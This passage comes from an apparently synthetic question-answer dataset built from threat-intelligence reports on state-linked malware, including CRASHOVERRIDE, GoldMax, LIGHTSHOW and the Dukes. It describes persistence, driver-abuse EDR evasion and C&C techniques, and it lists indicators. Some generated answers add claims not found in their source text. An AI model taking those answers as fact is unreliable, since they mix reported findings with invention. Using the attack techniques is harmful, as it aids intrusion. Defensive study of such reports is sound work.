weeks or more.\n\u2022 Dragos assesses with high confidence that the same malware was used in the cyber-attack to de-energize a transmission substation on December 17, 2016, resulting in outages for an unspecified number of customers.\n\u2022 The functionality in the CRASHOVERRIDE framework serves no espionage purpose and the only real feature of the malware is for attacks which would lead to electric outages.\n\u2022 CRASHOVERRIDE could be extended to other industries with additional protocol modules, but the adversaries have not demonstrated the knowledge of other physical industrial processes to be able to make that assessment anything other than a hypothetical at this point and protocol changes alone would be insufficient.\n\u2022 Dragos, Inc. tracks the adversary group behind CRASHOVERRIDE as ELECTRUM and assesses with high confidence through confidential sources that ELECTRUM has direct ties to the Sandworm team. Our intelligence ICS WorldView customers have received a comprehensive report and this industry report will not get into sensitive technical details but instead focus on information needed for defense and impact awareness.\nBig Headline: Background\nOn June 8th, 2017 the Slovak anti-virus firm ESET shared a subset of digital hashes of the malware described below and a portion of their analysis with Dragos. The Dragos team was asked to validate ESET's findings to news publications ESET had contacted about the story which would be published June 12th, 2017. Dragos would like to thank ESET for sharing the digital hashes which allowed the Dragos team to spawn its investigation. Without control of the timeline, it was Dragos' desire to publish a report alongside ESET's report to capture the nuance of electric grid operations. The report also contains new discoveries, indicators, and implications of the tradecraft. Also, because of the connection to the activity group Dragos tracks as ELECTRUM, it was our decision that an independent report was warranted. The Dragos team has been busy over the last 96 hours reproducing and verifying ESET's analysis, hunting for new samples of the malware and potential additional infections, notifying appropriate companies, and informing our customers. Importantly, Dragos also updated ICS vendors that needed to be made aware of this capability, relevant government agencies, many national computer emergency response teams (CERTs), and key players in the electric energy community. Our many thanks to those involved.\nIf you are a Dragos, Inc. customer, you will have already received the more concise and technically in-depth intelligence report. It will be accompanied by follow-on reports, and the Dragos team will keep you up-to-date as things evolve. It is in Dragos' view that the following report contains significant assessments that deserve a wide audience in the electric sector. Avoiding hype and fear should always be paramount but this case-study is of immediate significance, and this is not a singular contained event. The CRASHOVERRIDE capability is purpose built to impact electric grid operations and has been created as a framework to facilitate the impact of electric grids in other countries in the future outside the attack that took place with it December 17th, 2016 in Ukraine. However, as always, the defense is doable.\nMedium Headline: STUXNET\nThe STUXNET malware has been written about extensively and referenced, at times, unfortunately, in comparison to most ICS related incidents and malware. It was the first confirmed example of ICS tailored malware leveraged against a target. The Windows portion of the code with its four zero-day exploits gained a lot of notoriety. However, it was the malware's payload that was specific to ICS that was the most interesting component. The tradecraft exhibited by STUXNET was the detailed understanding of the industrial process. In IT networks, it is important for adversaries to identify vulnerabilities and exploit them to load malware and gain privileges on systems.\nIn ICS networks though, some of the most concerning issues are related to an adversary's ability to learn the physical process such as the engineering of the systems and their components in how they work together. STUXNET's greatest strength was leveraging functionality in Siemens equipment to interact with nuclear enrichment centrifuges through abuses of intended functionality. The purpose of the Siemens equipment was to be able to control and change the speed of the centrifuges. Stuxnet did this as well but with pre-programmed knowledge from the attackers on the speeds that would cause the centrifuge to burst from their casings. ICS tailored malware leveraging knowledge of industrial processes was now a thing. However, it was specific to Siemens equipment and unique to the Natanz facility in Iran. While tradecraft and exploits can be replicated, it was not reasonable to re-purpose the Stuxnet capability.\nMedium Headline: Dragonfly/HAVEX\nThe Dragonfly campaign was an espionage effort that targeted numerous industrial control system locations, estimates put it at over 2,000 sites, with a large emphasis on electric power and petrochemical asset owners. The Dragonfly campaign leveraged the HAVEX malware. There are often not many commonalities between different industrial sites. Even a single substation in one company can be almost entirely different than a substation in the same company based on vendors, implementation, integration, and the physical processes required at each site. One of the few commonalities across numerous ICS industries though is the OPC protocol. It is designed to be the universal translator for many industrial components and is readily accessible in an HMI or dedicated OPC server. The HAVEX malware leveraged legitimate functionality in the OPC protocol to map out the industrial equipment and devices on an ICS network. It was a clever use of the protocol and while the malware itself was not complex the tradecraft associated with the usage of OPC was sophisticated. However, the Dragonfly campaign was focused entirely on espionage. There was no physical disruption or destruction of the industrial process. Instead, it was the type of data you would want to leverage to design attacks in the future built for the specific targets impacted with the malware.\nMedium Headline: BLACKENERGY 2\nThe Sandworm team has targeted numerous industries ranging from western mil-itaries, governments, research organizations, defense contractors, and industrial sites. It was their use of the BLACKENERGY 2 malware that caught the ICS industry's attention. This ICS tailored malware contained exploits for specific types of HMI applications including Siemens SIMATIC, GE CIMPLICITY, and Advantech We-bAccess. BLACKENERGY 2 was a smart approach by the adversaries to target in-ternet connected HMIs. Upon exploitation of the HMIs, the adversaries had access to a central location in the ICS to start to learn the industrial process and gain the graphical representation of that ICS through the HMI. The targeting of HMIs alone is often not enough to cause physical damage, but it is an ideal target for espionage and positioning in an ICS. Gaining a foothold in the network that had access to numerous components of the ICS while maintaining command and control to Internet locations, positioned it well for espionage.\nQuestion: What makes CRASHOVERRIDE a significant threat to electric grid operations, and how does its extensibility contribute to its potential impact?",
    "output": "Answer: CRASHOVERRIDE is significant because it is the first malware framework designed to attack electric grids and can be easily repurposed for different regions and configurations. Its extensibility allows it to be adapted to other protocols, such as DNP3, making it effective in the North American grid with minimal tailoring. This adaptability increases its potential impact, as it can be leveraged at multiple sites simultaneously, causing hours or even a few days of outages.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: User Access Logging (UAL)\nThe Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases. In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant.\nThe UAL database is available by default on Server editions of Windows starting with Server 2012. This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default. UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred. One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful. An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found .\nIn multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data. Even though it's only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system. For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.\nThis allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior. Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.\nSmall Headline: TrailBlazer\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for WMI persistence (generally uncommon in 2019)\nUsed likely compromised infrastructure for C2\nMasquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests\nTrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence. The malware shares high-level functionality with other malware families. In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST. TrailBlazer persists on a compromised host using WMI event subscriptions4  \u2014 a technique also used by  \u2014 although this persistence mechanism is not exclusive to COZY BEAR.5\nIn the obfuscated example above, TrailBlazer ( <FILENAME> .exe ) would be executed when the system's uptime was between 180 and 480 seconds.\nSmall Headline: GoldMax (Linux variant)\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for persistence via a crontab entry with a @reboot line\nUsed likely compromised infrastructure for C2\nGoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks. Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux\nplatform that the threat actor deployed in mid-2019. This variant extends the backdoor's known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows.\nThe 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant. The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections. It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.\nPersistence was established via a crontab entry for a non-root user. With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot. Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.\nBig Headline: Enumeration Tools/Unique Directory Structure\nThroughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit. While the script's contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.\nIn each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool. After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims' various domains. In addition, the randomly named directories are typically created in a previously existing directory that's one level off of the root of the C drive. The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters. To date, the names of the directories have always been formed from lowercase alphanumeric characters. For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where \"XX\" is a previously existing directory on the system):\nC:\\XX\\[a-z0-9]{6}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain.FQDN\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain-2.FQDN\nIn each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories. This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename). In addition, the Jump List for wscript.exe contained evidence of the VBScript files. The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in. Two examples are env.vbs and WinNet.vbs . Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary.\nBig Headline: Internal Wiki Access\nAcross multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims' internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics. While operating in the victim's internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided. This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks. Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact. In some instances these points of contact were subsequently targeted for further data collection.\nThe threat actor's wiki access could be considered an extension of \"Credential Hopping\" described earlier. The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials. CrowdStrike observed the threat actor accessing the wiki as users who would be considered \"non-privileged\" from an Active Directory perspective but had access to sensitive data specific to the victim's products or services.\nAt this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations. CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor. Given the threat actor's penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations. CrowdStrike recommends the following best practices for internal information repositories:\nEnable detailed access logging\nEnsure logs are centralized and stored for at least 180 days\nCreate detections for anomalous activity such as access from an unusual location like a server subnet\nEnable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA\n\nDescribe the persistence mechanism used by the Linux variant of GoldMax and how it differs from the Windows variant.",
    "output": "The Linux variant of GoldMax uses a crontab entry with a @reboot line for persistence, ensuring the malware executes upon system reboot. It also uses the nohup command to ignore hangup signals, allowing the process to continue running even if the terminal session is terminated. Unlike the Windows variant, which relies on different persistence mechanisms, the Linux variant focuses on crontab and nohup for maintaining its presence on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Stealing the LIGHTSHOW (Part Two) \u2014 LIGHTSHIFT and LIGHTSHOW\nIn part one on (<https://www.mandiant.com/resources/blog/lightshow-north-korea-unc2970>)North Korea's UNC2970, we covered (<https://advantage.mandiant.com/actors/threat-actor--90d4205f-c1a0-54ab-9d43-e2a507c82de9>)UNC2970's tactics, techniques and procedures (TTPs) and tooling that they used over the course of multiple intrusions. In this installment, we will focus on how UNC2970 utilized Bring Your Own Vulnerable Device (BYOVD) to further enable their operations.\nDuring our investigation, Mandiant consultants identified most of the original compromised hosts, targeted by UNC2970, contained the files %temp%\\<random>_SB_SMBUS_SDK.dll and suspicious drivers, created around the same time on disk.\nAt the time Mandiant initially identified these files, we were unable to determine how they were dropped or the exact use for these files. It wasn't until later in the investigation, during analysis of a forensic image, where the pieces started falling into place. A consultant noticed multiple keyword references to the file C:\\ProgramData\\USOShared\\Share.DAT (MD5: def6f91614cb47888f03658b28a1bda6 ). Upon initial glance at the Forensic Image, this file was no longer on disk. However, Mandiant was able to recover the original file, and the initial analysis of the sample found that Share.DAT was a XORed data blob, which was encoded with the XOR key 0x59 .\nThe decoded payload (MD5: 9176f177bd88686c6beb29d8bb05f20c ), referred to by Mandiant as , is an in-memory only dropper. The LIGHTSHIFT dropper distributes a payload (MD5: ad452d161782290ad5004b2c9497074f ) that Mandiant refers to as . Once loaded into memory, LIGHTSHIFT invokes the exports Create then Close in that order. The response from Close is written as a hex formatted address to the file C:\\Windows\\windows.ini .\nLIGHTSHOW is a utility that makes use of two primary anti-analysis techniques used to hinder both dynamic and static analysis. To deter static analysis, LIGHTSHOW was observed being packed by VM-Protect. In an effort to thwart dynamic analysis, LIGHTSHOW is targeted to a specific host and requires a specific SHA256 hash corresponding to a specific computer name or the sample will not fully execute. Once FLARE completed the analysis of LIGHTSHOW, we were able to understand how the files %temp%\\ <random>_SB_SMBUS_SDK.dll and drivers were created on disk.\nLIGHTSHOW is a utility that was used by UNC2970 to manipulate kernel data-structures and represents an advancement in DPRK's capabilities to evade detection. To accomplish this, LIGHTSHOW drops a legitimate version of a driver with , with a SHA256 hash of\n175eed7a4c6de9c3156c7ae16ae85c554959ec350f1c8aaa6dfe8c7e99de3347 to\nC:\\Windows\\System32\\Drivers with one of the following names chosen at random and appended with mgr :\ncirclass\ndmvsc\nhidir\nisapnp\numpass\nLIGHTSHOW then creates the registry key\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service name> where <service name> is the same as the chosen filename without appended mgr . It then creates a registry key with the value name ImagePath , which points to the path of the driver. The sample then loads the driver using NtLoadDriver . LIGHTSHOW drops and loads a dummy DLL %temp%\\<random>_SB_SMBUS_SDK.dll to register itself to the driver as a legitimate caller.\nUsing the vulnerable driver, LIGHTSHOW can perform arbitrary read and write operations to kernel memory. LIGHTSHOW uses this read/write primitive to patch different kernel routines, which are related to the type of facilities an Endpoint Detection and Response (EDR) software may use, to enable evasion of said EDR software. After the read and write operations to kernel memory, the sample unloads and deletes %temp%\\ <random\\>_SB_SMBUS_SDK.dll .\nExamining the chain of execution, we see further obfuscation techniques being employed in LIGHTSHOW. UNC2970 has a concerted effort towards obfuscation and employs multiple methods to do this throughout the entire chain of delivery and execution.\nLIGHTSHOW is another example of tooling that looks to capitalize on the technique of BYOVD. BYOVD is a technique that utilizes the abuse of legitimate and trusted, but vulnerable drivers, to bypass kernel level protections. This technique has been utilized by adversaries ranging from financial actors, such as (<https://www.mandiant.com/resources/blog/hunting-attestation-signed-malware>)UNC3944, to espionage actors like UNC2970, which shows its usefulness during intrusion operations. AHNLab recently released a (<https://asec.ahnlab.com/wp-content/uploads/2022/10/Analysis-Report-on-Lazarus-Groups-Rootkit-Attack-Using-BYOVD_Oct-05-2022-3.pdf>)report on activity tracked as Lazarus Group that focused largely on the use of BYOVD. While Mandiant did not observe the hashes included in the AHNLab report, the use of SB_SMBUS_SDK.dll as well as other similarities, such as the exported functions Create and Close , indicate an overlap between the activity detailed in this blog post and those detailed by AHNLab.\nThroughout several incidents we responded to in 2022 that involved UNC2970, we observed them utilizing a small set of vulnerable drivers. This includes the (<https://www.dell.com/support/kbdoc/nl-nl/000186019/dsa-2021-088-dell-client-platform-security-update-for-an-insufficient-access-control-vulnerability-in-the-dell-dbutil-driver?lang=en>)Dell DBUtil 2.3 and the ENE Technology device drivers. UNC2970 utilized both of these drivers in an attempt to evade detection. These two drivers, and many more, are found in the (<https://github.com/hfiref0x/KDU>)Kernel Driver Utility (KDU) toolkit. With this in mind, it is likely that we will continue to see UNC2970 abuse vulnerable drivers from other vendors.\nMandiant has worked to detect and mitigate BYOVD techniques for a (<https://github.com/mandiant/Vulnerability-Disclosures>)number of years and has worked closely with industry allies to report vulnerabilities when discovered. During research being carried out on UNC2970 we discovered a  that the actor had access to, but did not know was vulnerable - essentially making it a 0day in the wild but not being actively exploited. This was verified through our Offensive Task Force who subsequently carried out a notification to the affected organization and reported the vulnerability to MITRE, which was assigned (<https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2023/MNDT-2023-0003.md>)CVE-2022-42455.\n\nHow does the LIGHTSHOW utility utilize the Bring Your Own Vulnerable Device (BYOVD) technique to evade detection, and what specific drivers and methods does it employ?",
    "output": "A: LIGHTSHOW utilizes the BYOVD technique by abusing legitimate and trusted, but vulnerable drivers to bypass kernel-level protections. Specifically, it drops a legitimate version of a driver with a specific SHA256 hash to the System32 directory with a randomly chosen name appended with 'mgr'. It then creates a registry key pointing to the path of the driver and loads it using NtLoadDriver. LIGHTSHOW also drops a dummy DLL to register itself to the driver as a legitimate caller. Using the vulnerable driver, LIGHTSHOW performs arbitrary read and write operations to kernel memory, patching different kernel routines related to EDR software to enable evasion. After these operations, it unloads and deletes the dummy DLL.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIVE SUMMARY\nThe attack on Sony Pictures Entertainment in November 2014 was not a single incident. Through technical indicators, we connect the attack to several destructive events going back to at least 2009.\nThe identity of the perpetrators is unknown, but several of these previous events have been attributed by others to North Korean threat actors. In this report, we show how we have connected these events to the threat actors known as DarkSeoul or Silent Chollima.\nWhoever they are, this group is still active, mainly going after South Korean targets in several sectors. Malware belonging to this threat complex has apparently been produced as late as January 2016.\nWe detail the evolution of some of the most common tools used by these attackers and present indicators of compromise and mitigation information where we can.\nIn parallel with this report, the security company Novetta is publishing its own independent research covering the same threat complex. This report is available from .\nBig Headline: MALWARE KNOWN TO BE CONNECTED WITH THE SONY CASE\nTo start at the beginning: The official statements from the FBI (1) and US-CERT (2) mention the md5 hashes of the following set of malware files:\nIn the weeks following the attack, a number of other malware instances came to light that were obviously connected; such as\nMost vendors now use the name Destover for a group of malware that was part of the Sony intrusion. Though many pieces of  malware are somewhat different, we'll use that name as well to avoid confusion.\nThe US-CERT advisory also mentions the import hashes of a number of other malware. These are non-unique indicators, but can help in locating related samples.\nMedium Headline: A NOTE ABOUT THE HANGUL WORD PROCESSOR (*.HWP, HWPX) FORMAT\nThe Hangul Word Processor is software developed by the Korean company Hancom. It is similar in usage area to Microsoft Word, but is specifically adapted to the Korean written language Hangul.\nThe file format used by this software is also somewhat similar to Microsoft Word, with the use of OLE2-based documents for previous versions of HWP, and ZIP archive-based documents for newer versions.\nA number of vulnerabilities have existed for these formats. These have been used maliciously by several different threat actors over time, also by the threat actors mentioned in this paper.\nMedium Headline: MALWARE ARCHEOLOGY\nAs research into this case progressed, it became obvious that we were tracing malware relationships back in time. In fact, the earliest indicators we've found go all the way back to at least 2009.\nAround this time a malware development project started that would become the backbone of intrusions and destructive attacks against mainly South Korean targets for years to come. In fact, modern-day malware from the same threat actor still contains traces of this first eo-malware. The initial starting points were likely publicly available source codes for Rbot and Mydoom, found on Chinese code sharing sites like Programmers United Develop Net (PUDN).\nThere is no universally adopted naming for the early generations of this family in the AV industry. Usually they are detected as Dllbot or Npkon, but these names can also cover other families, thus our use of a different name in this paper - KorDllbot.\nWe will cover the evolution of KorDllbots and related malware, and how these came to be involved in various intrusion cases.\nTIMELINE OF LIKELY DARKSEOUL-RELATED ATTACKS\nA timeline of destructive intrusions in or related to the Korean peninsula.\nRead the text above and answer this question: How does the analysis of the malware used in the Sony Pictures Entertainment attack in 2014 relate to earlier incidents, particularly those attributed to North Korean threat actors?",
    "output": "The attack on Sony Pictures Entertainment in November 2014 was not an isolated event. Through technical indicators, it has been linked to several destructive incidents dating back to at least 2009. These earlier events have been attributed by others to North Korean threat actors, specifically the groups known as DarkSeoul or Silent Chollima. The report details the evolution of common tools used by these attackers, providing indicators of compromise and mitigation information. The group behind these attacks remains active, primarily targeting South Korean entities across various sectors. Malware associated with this threat complex has been observed as recently as January 2016.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the unconventional method used by the Sayad malware authors to export a native API from a C# DLL, and discuss the implications of this technique for malware analysis and detection.",
    "output": "The Sayad malware authors used an unconventional method to export a native API from a C# DLL by modifying the MSIL (Microsoft Intermediate Language) to map a managed static method to the name of a native unmanaged API. This modification allows the API to appear in the Export Address Table of the managed PE (Portable Executable) image, despite the Microsoft C# compiler not supporting this feature natively. Specifically, they mapped the static Main() method of the Program class to the native API '78121'. This technique has significant implications for malware analysis and detection because it demonstrates a sophisticated level of manipulation that can bypass traditional detection mechanisms. Analysts must be aware of such advanced techniques to effectively identify and mitigate similar threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the BlackEnergy APT group's use of spearphishing with Word documents relate to Network Denial of Service attacks?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users. In the context of the BlackEnergy APT group's attacks, their use of spearphishing with Word documents may seem unrelated to Network DoS at first glance. However, considering the group's history of conducting DDoS attacks, as mentioned in the report, it is possible that their spearphishing efforts are a precursor to a larger attack plan that includes Network DoS. The group's use of Word documents with macros could be a way to gain initial access to a target's network, which could then be used as a foothold to launch a Network DoS attack. Furthermore, the report mentions that the BlackEnergy APT group has targeted critical sectors in Ukraine, including energy and media companies. A Network DoS attack against these organizations could have significant consequences, including disrupting critical infrastructure and blocking access to important information. Therefore, while the use of spearphishing with Word documents may not be a direct example of a Network DoS attack, it could be a tactic used by the BlackEnergy APT group to ultimately conduct a Network DoS attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 3.2 Attribution to the Dukes\nIt is important to note that when we describe so-called \"APT groups\", we're making connections based on technical indicators such as code similarities, shared C&C infrastructure, malware execution chains, and so on  We're typically not directly involved in the investigations and identification of the individuals writing the malware and/or deploying it, and the interpersonal relationships between them  Furthermore, the term \"APT group\" is very loosely defined, and often used merely to cluster the abovementioned malware indicators  This is also one of the reasons  why we refrain from speculation with regard to attributing attacks to nation states and such\nOn one hand, we noticed numerous similarities in the tactics of this campaign in comparison to previously documented ones:\n\u2022 Use of Twitter (and other social websites such as Reddit) to host C&C URLs.\n\u2022 Use of steganography in pictures to hide payloads or C&C communications.\n\u2022 Use of Windows Management Instrumentation (WMI) for persistence.\nWe also noticed important similarities in the targeting:\n\u2022 All the known targets are Ministries of Foreign Affairs.\n\u2022 Two of the three known targeted organizations were previously compromised by other Dukes malware  such as CozyDuke, OnionDuke or MiniDuke.\n\u2022 On some machines compromised with PolyglotDuke and MiniDuke, we noticed that CozyDuke  was installed only a few months before.\nHowever, an attribution based only on the presence of known Dukes tools on the same machines should be taken with a grain of salt. We also found two other APT threat actors \u2013 Turla (<>)[19] and Sednit (<>)[20] \u2013 on some of the same computers.\nOn the other hand, we were able to find strong code similarities between already documented samples  and samples from Operation Ghost. We cannot discount the possibility of a false flag operation; however,  this campaign started while only a small portion of the Dukes' arsenal was known. In 2013, at the first known compilation date of PolyglotDuke, only MiniDuke had been documented and threat analysts were not yet aware of the importance of this threat actor. Thus, we believe Operation Ghost was run simultaneously with the other campaigns and has flown under the radar until now.\nPolyglotDuke (SHA-1: D09C4E7B641F8CB7CC86190FD9A778C6955FEA28), documented in detail in (<>)section 4 2 uses a custom encryption algorithm to decrypt the strings used by the malware. We found functionally equivalent code in an OnionDuke sample (SHA-1: A75995F94854DEA8799650A2F4A97980B71199D2)  that was documented by F-Secure in 2014 (<>)[16]. It is interesting to note that the value used to seed  the srand function is the compilation timestamp of the executable. For instance, 0x5289f207 corresponds to Mon 18 Nov 2013 10:55:03 UTC.\nThe IDA screenshots in (<>)Figure 6 show the two similar functions.\nSimilarly, the recent samples of the MiniDuke backdoor bear similarities with samples documented more than five years ago. (<>)Figure 7 is the comparison of a function in a MiniDuke backdoor listed by Kaspersky  in 2014 (<>)[21] (SHA-1: 86EC70C27E5346700714DBAE2F10E168A08210E4) and a MiniDuke backdoor (SHA-1: B05CABA461000C6EBD8B237F318577E9BCCD6047) compiled in August 2018.\nGiven the numerous similarities between other known Dukes campaigns and Operation Ghost, especially  the strong code similarities, and the overlap in time with previous campaigns, we assess with high  confidence that this operation is run by the Dukes.\nMedium Headline: 3.3 Tactics and tools\nIn Operation Ghost, the Dukes have used a limited number of tools, but they have relied on numerous  interesting tactics to avoid detection.\nFirst, they are very persistent. They steal credentials and use them systematically to move laterally on the network. We have seen them using administrative credentials to compromise or re-compromise machines on the same local network. Thus, when responding to a Dukes compromise, it is important to make sure  to remove every implant in a short period of time. Otherwise, the attackers will use any remaining implant to compromise the cleaned systems again.\nSecond, they have a sophisticated malware platform divided in four stages:\n\u2022 PolyglotDuke, which uses Twitter or other websites such as Reddit and Imgur to get its C&C URL.  It also relies on steganography in pictures for its C&C communication.\n\u2022 RegDuke, a recovery first stage, which uses Dropbox as its C&C server. The main payload is encrypted  on disk and the encryption key is stored in the Windows registry. It also relies on steganography as above.\n\u2022 MiniDuke backdoor, the second stage. This simple backdoor is written in assembly. It is very similar  to older MiniDuke backdoors.\n\u2022 FatDuke, the third stage. This sophisticated backdoor implements a lot of functionalities and has a very flexible configuration. Its code is also well obfuscated using many (<https://en.wikipedia.org/wiki/Opaque_predicate>)opaque predicates. They re-compile  it and modify the obfuscation frequently to bypass security product detections.\nThird, we also noticed that the operators avoid using the same C&C network infrastructure between different victim organizations. This kind of compartmentalization is generally only seen by the most  meticulous attackers. It prevents the entire operation from being burned when a single victim discovers  the infection and shares the related network IoCs with the security community.\nMedium Headline: 3.4 Operational times\nWhen it comes to cyberespionage, it is not uncommon for the malware developers and operators to follow the standard working hours of the country where they are located. For instance, we previously showed that Sednit operators were generally working from 9 AM to 5PM in the UTC+3 time zone (<>)[20]. Previously, FireEye researchers noticed that the Dukes were also mainly operating in the UTC+3 time zone (<>)[12].\nFor Operation Ghost, we compiled three different types of timestamp in order to have an idea of their operational times:\n\u2022 The time at which they uploaded C&C pictures to the Dropbox account used by RegDuke\n\u2022 The time at which they posted encoded C&C URLs on the social media accounts used by PolyglotDuke\n\u2022 The compilation timestamps of dozens of samples. We believe they were not tampered with,  as they are consistent with what we see in ESET telemetry data.\nIt should be noted that some of these timestamps may have been generated by an automated command system or an automated build system.\nOperational Hours\nMedium Headline: 4.1 Compromise vector\nDespite having analyzed the Dukes activities in several different organizations, we were not able to find the initial compromise vector. The group is known for sending well-crafted malicious emails, but we did not find any such samples.\nIt should also be noted that two of the three targeted organizations we identified had previously been compromised by the Dukes, mainly in 2015. As such, it is highly possible that the attackers kept control over the compromised networks during this whole period. We observed them pivoting in an already-compromised network using lateral movement tools like PsExec and stolen administrative credentials. As such, from only a few compromised machines, they are able to expand their operations.\n\nQuestion: How does the attribution of Operation Ghost to the Dukes rely on both technical indicators and targeting patterns? Explain the significance of these factors in attributing the campaign.\n\nAnswer:",
    "output": "Attribution of Operation Ghost to the Dukes is based on several technical indicators and targeting patterns. Technical indicators include the use of Twitter and other social websites for hosting C&C URLs, the use of steganography in pictures to hide payloads or C&C communications, and the use of Windows Management Instrumentation (WMI) for persistence. Additionally, all known targets are Ministries of Foreign Affairs, and two of the three known targeted organizations were previously compromised by other Dukes malware such as CozyDuke, OnionDuke, or MiniDuke. These similarities in tactics and targeting suggest a consistent modus operandi, strengthening the attribution to the Dukes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Topsec association\nnoted that the registration information for infrastructure used in the Anthem breach leads back to a Chinese origin. Infrastructure associated with the Mivast malware sample (MD5:230D8 A7A60A07DF28A291B13DDF3351F) seen in the Anthem attacks resolved to IP address 192.199.254.126. The domain topsec2014.com was one of only a few domains hosted on this IP address close to the same time frame that Mivast accessed C&C infrastructure hosted on the same IP address.\nThe topsec2014. com domain can be traced back to the registrant address topsec2014@163.com, which is believed to be associated with the similar email address TopSec_2014@163.com. The topsec2014 domain and the previously mentioned email addresses are associated with an organization called Topsec.\nFigure 4. Details on the Topsec Network Security & Technology Company\nTopsec is a company that began as a research institute in Beijing and has since expanded to nearly every province of China. The organization focuses on security research, training, auditing, and products. Its customers include private businesses as well as public agencies. It also hosts an annual hacking competition known as the Topsec Cup and has reportedly hired known hackers to provide security services and training.\nMedium Headline: Zero-day access and distribution\nMultiple Black Vine campaigns have exploited previously unknown zero-day vulnerabilities to deliver the group's custom payload. Zero-day exploits typically require attackers to have an advanced skillset to identify and then determine how to exploit the unheard-of vulnerability. Generally, these exploits can be purchased through underground networks or may be created by specialized exploit developers. Both approaches require access to extensive financial resources.\nIn the case of Black Vine, Symantec has identified a pattern between this attack group's activity and other cyberespionage-related campaigns. These campaigns were seen using the same zero-day exploits but delivering a different payload. There appears to be shared access to zero-day exploits, which are distributed and used within days of one another among different attack groups, as the diagram in Figure 5 shows.\nSmall Headline: Concurrent CVE-2012-4792 zero-day exploits\nIn late December 2012, the Council on Foreign Relations' (CFR) website was compromised. The domain was reported as serving an exploit against an unknown vulnerability found in Internet Explorer 6, which was eventually labelled CVE-2012-4792. At the time of exploitation, there was no patch or remediation in place for the vulnerability, leaving victims using the vulnerable version of Internet Explorer helpless. Once the unpatched vulnerability was exploited, the attackers delivered a variant of  to the victim's computer. Based on Symantec's previous findings, Bifrose has been associated with another 